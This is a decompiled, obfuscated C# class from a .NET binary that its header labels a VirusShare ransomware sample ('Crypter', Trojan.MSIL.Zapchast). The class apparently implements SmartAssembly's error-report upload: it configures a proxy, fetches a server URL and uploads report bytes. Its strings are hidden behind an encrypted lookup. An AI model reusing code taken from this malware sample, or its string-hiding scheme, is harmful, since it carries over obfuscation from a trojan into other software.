// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Crypter, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B731B599-442F-4A0A-B652-36FDF3199CF1
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.MSIL.Zapchast.ctbt-4d7f60f5f9cd63e753868459d0468b2925cdad0dc9dd53f889e662aa428efebf.exe

using \u0007;
using \u000E;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace \u0005
{
  internal sealed class \u0007
  {
    internal static readonly string \u0001;
    private string \u0002;
    private string \u0003;
    private IWebProxy \u0001;
    [NonSerialized]
    internal static GetString \u0089;

    public void \u0001([In] IWebProxy obj0)
    {
      try
      {
        this.\u0001 = obj0;
      }
      catch (Exception ex)
      {
        IWebProxy webProxy = obj0;
        \u0003.\u0001(ex, (object) this, (object) webProxy);
        throw;
      }
    }

    public void \u0001([In] \u0002 obj0)
    {
      UploadReportLoginService1 reportLoginService1_1;
      try
      {
        if (this.\u0003 == null)
        {
          try
          {
            reportLoginService1_1 = new UploadReportLoginService1();
            if (this.\u0001 != null)
              \u0097\u0002.\u007E\u0011\u0004((object) reportLoginService1_1, this.\u0001);
            this.\u0003 = reportLoginService1_1.GetServerURL(this.\u0002);
            if (\u001C.\u007E\u009C((object) this.\u0003) == 0)
              throw new ApplicationException(\u0005.\u0007.\u0089(3359));
            if (\u0006.\u000E(this.\u0003, \u0005.\u0007.\u0089(3400)))
              this.\u0003 = \u0005.\u0007.\u0001;
          }
          catch (Exception ex)
          {
            obj0(global::\u000E.\u0011(\u0005.\u0007.\u0089(3409), \u008F.\u007E\u0080\u0002((object) ex)));
            return;
          }
        }
        obj0(\u0087.\u007E\u0015\u0002((object) this.\u0003, \u0005.\u0007.\u0089(1461)) ? this.\u0003 : \u0005.\u0007.\u0089(1403));
      }
      catch (Exception ex)
      {
        UploadReportLoginService1 reportLoginService1_2 = reportLoginService1_1;
        Exception exception = ex;
        \u0002 obj = obj0;
        \u0003.\u0001(ex, (object) reportLoginService1_2, (object) exception, (object) this, (object) obj);
        throw;
      }
    }

    public void \u0001([In] byte[] obj0, [In] string obj1, [In] string obj2, [In] string obj3, [In] \u0002 obj4)
    {
      ReportingService1 reportingService1_1;
      try
      {
        try
        {
          reportingService1_1 = new ReportingService1(this.\u0003);
          if (this.\u0001 != null)
            \u0097\u0002.\u007E\u0011\u0004((object) reportingService1_1, this.\u0001);
          obj4(reportingService1_1.UploadReport2(this.\u0002, obj0, obj1, obj2, obj3));
        }
        catch (Exception ex)
        {
          obj4(global::\u000E.\u0011(\u0005.\u0007.\u0089(3426), \u008F.\u007E\u0080\u0002((object) ex)));
        }
      }
      catch (Exception ex)
      {
        ReportingService1 reportingService1_2 = reportingService1_1;
        Exception exception = ex;
        byte[] numArray = obj0;
        string str1 = obj1;
        string str2 = obj2;
        string str3 = obj3;
        \u0002 obj = obj4;
        \u0003.\u0001(ex, (object) reportingService1_2, (object) exception, (object) this, (object) numArray, (object) str1, (object) str2, (object) str3, (object) obj);
        throw;
      }
    }

    public \u0007([In] string obj0)
    {
      try
      {
        this.\u0002 = obj0;
      }
      catch (Exception ex)
      {
        string str = obj0;
        \u0003.\u0001(ex, (object) this, (object) str);
        throw;
      }
    }

    static \u0007()
    {
label_0:
      try
      {
        if (true)
          Strings.CreateGetStringDelegate(typeof (\u0005.\u0007));
        do
        {
          if (true)
          {
            if (true)
              \u0005.\u0007.\u0001 = \u0005.\u0007.\u0089(3443);
          }
          else
            goto label_0;
        }
        while (false);
      }
      catch (Exception ex)
      {
        \u0003.\u0001(ex);
        throw;
      }
    }
  }
}
